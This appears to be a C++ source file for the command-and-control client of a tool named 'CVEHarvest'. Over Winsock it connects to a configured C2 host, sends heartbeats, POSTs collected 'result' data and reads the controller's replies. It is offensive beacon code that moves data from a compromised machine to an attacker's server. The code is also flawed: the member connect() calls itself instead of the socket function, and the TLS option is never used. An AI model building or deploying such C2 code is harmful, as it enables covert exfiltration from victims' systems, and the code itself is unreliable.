#include "CVEHarvest.hpp"

#include <array>
#include <sstream>

namespace cveh {

    C2Client::C2Client(const std::string& host, uint16_t port, bool tls)
        : host_(host), port_(port), tls_(tls) {
    }

    C2Client::~C2Client() {
        if (sock_ != INVALID_SOCKET) {
            closesocket(sock_);
            sock_ = INVALID_SOCKET;
        }
        WSACleanup();
    }

    bool C2Client::connect() {
        WSADATA wsa{};
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return false;

        sock_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock_ == INVALID_SOCKET) return false;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port_);
        addr.sin_addr.s_addr = inet_addr(host_.c_str());

        if (connect(sock_, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
            closesocket(sock_);
            sock_ = INVALID_SOCKET;
            return false;
        }
        return true;
    }

    bool C2Client::send_heartbeat() {
        if (sock_ == INVALID_SOCKET) return false;
        std::string payload = "{\"type\":\"heartbeat\",\"ts\":1}";
        return send(sock_, payload.c_str(), static_cast<int>(payload.size()), 0) != SOCKET_ERROR;
    }

    bool C2Client::send_result(const std::string& json_blob) {
        if (sock_ == INVALID_SOCKET) return false;
        std::string msg = "POST /result HTTP/1.1\r\nHost: " + host_ + "\r\nContent-Type: application/json\r\nContent-Length: " +
            std::to_string(json_blob.size()) + "\r\nConnection: close\r\n\r\n" + json_blob;
        int sent = send(sock_, msg.c_str(), static_cast<int>(msg.size()), 0);
        return sent != SOCKET_ERROR;
    }

    std::string C2Client::recv_response() {
        if (sock_ == INVALID_SOCKET) return "";
        std::array<char, 4096> buffer{};
        int n = recv(sock_, buffer.data(), static_cast<int>(buffer.size()) - 1, 0);
        if (n <= 0) return "";
        buffer[n] = '\0';
        return std::string(buffer.data());
    }

    std::string C2Client::encode_json(const std::string& s) {
        return json_quote(s);
    }

}
